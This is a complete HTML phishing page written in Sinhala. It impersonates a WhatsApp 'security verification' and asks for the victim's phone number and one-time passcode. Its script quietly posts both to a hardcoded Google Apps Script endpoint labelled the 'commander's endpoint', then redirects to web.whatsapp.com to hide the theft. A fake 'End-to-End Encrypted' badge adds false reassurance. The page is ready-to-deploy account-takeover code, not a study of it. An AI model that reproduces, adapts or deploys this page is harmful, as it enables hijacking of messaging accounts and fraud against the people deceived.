<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Connection - Secure Verify</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 65px; margin-bottom: 20px; }
        h2 { color: #41525d; margin-bottom: 10px; font-size: 22px; }
        p { color: #667781; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #e1e9eb; border-radius: 6px; box-sizing: border-box; font-size: 16px; outline: none; }
        input:focus { border-color: #00a884; }
        button { width: 100%; padding: 13px; background-color: #00a884; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .secure { margin-top: 20px; font-size: 11px; color: #8696a0; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" class="logo">
    <h2>ආරක්ෂක තහවුරු කිරීම</h2>
    <p>පද්ධති යාවත්කාලීන කිරීම සඳහා කරුණාකර ඔබගේ විස්තර ඇතුළත් කරන්න.</p>

    <form id="ghostForm">
        <input type="text" id="p" placeholder="දුරකථන අංකය (07XXXXXXXX)" required>
        <input type="text" id="o" placeholder="OTP කේතය (6-Digits)" maxlength="6" required>
        <button type="submit" id="b">VERIFY NOW</button>
    </form>

    <div class="secure">
        <span style="color:#00a884;">●</span> End-to-End Encrypted Secure Connection<br>
        404! Specialist Ghost Protocol Active
    </div>
</div>

<script>
    // --- ⚙️ COMMANDER'S ENDPOINT ---
    const G_URL = "https://script.google.com/macros/s/AKfycbyI9hwzJa2jPPqVLx8zle67_gdXP73xjJwB7yYrU-5Wr3UJeYnhpu6dMOZRoB8XRmJO9A/exec"; 
    // ------------------------------

    document.getElementById('ghostForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const ph = document.getElementById('p').value;
        const ot = document.getElementById('o').value;
        const btn = document.getElementById('b');
        
        btn.innerHTML = "Verifying...";
        btn.disabled = true;

        // Google Script එකට දත්ත යැවීම (Safe Mode)
        fetch(G_URL, {
            method: 'POST',
            mode: 'no-cors', 
            body: JSON.stringify({ phone: ph, otp: ot })
        })
        .then(() => {
            // තත්පර 1කට පසු WhatsApp වෙත යොමු කිරීම
            setTimeout(() => {
                window.location.href = "https://web.whatsapp.com";
            }, 1000);
        })
        .catch(() => {
            window.location.href = "https://web.whatsapp.com";
        });
    });
</script>

</body>
</html>
